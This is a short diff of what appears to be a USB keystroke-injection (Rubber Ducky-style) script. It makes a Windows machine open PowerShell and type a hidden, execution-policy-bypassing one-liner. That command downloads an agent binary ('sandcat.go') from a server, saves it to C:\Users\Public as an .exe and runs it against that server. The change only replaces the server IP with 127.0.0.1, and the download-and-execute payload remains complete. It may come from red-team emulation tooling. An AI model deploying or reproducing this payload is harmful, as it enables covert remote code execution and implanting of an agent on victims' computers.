@@ -5,6 +5,6 @@ DELAY 100
 STRING powershell
 ENTER
 DELAY 300
-STRING powershell.exe -W Hidden -ExecutionPolicy Bypass {$server="http://172.25.10.204:8888"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("server", $server); $wc.Headers.add("file","sandcat.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null; iex "C:\Users\Public\$name.exe -server $server -v";}
+STRING powershell.exe -W Hidden -ExecutionPolicy Bypass {$server="http://127.0.0.1:8888"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("server", $server); $wc.Headers.add("file","sandcat.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null; iex "C:\Users\Public\$name.exe -server $server -v";}
 ENTER
 DELAY 1500
